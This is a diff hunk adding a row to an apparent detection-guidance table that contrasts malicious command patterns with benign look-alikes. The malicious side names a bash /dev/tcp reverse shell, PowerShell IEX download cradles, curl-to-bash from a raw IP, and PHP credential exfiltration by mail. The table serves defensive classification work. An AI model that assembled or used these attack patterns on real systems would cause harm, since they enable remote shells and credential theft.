@@ -57,6 +57,7 @@ its surface features but not its intent:
 | IEX + `DownloadString` cradle | admin script: `DownloadFile` to disk | execution primitive (IEX), not the download |
 | `-enc` + hidden window | base64 *config* decode | the encoded-command + window-suppression combo |
 | `bash -i >& /dev/tcp/...` | backup with `>&` / `2>&1` redirects | `/dev/tcp` socket use |
+| `bash -i >& /dev/tcp/...` | `/dev/tcp` TCP port-check (no interactive shell) | the interactive shell (`bash -i`), not `/dev/tcp` alone |
 | `curl http://<ip> \| bash` | rustup-style `curl https://host \| sh` | raw-IP-over-http source |
 | `$_POST['password']` → `mail(attacker)` | same-origin login handler | the outbound exfil, not the capture |
 | Telegram API carrying creds | Telegram API carrying deploy status | credential context |
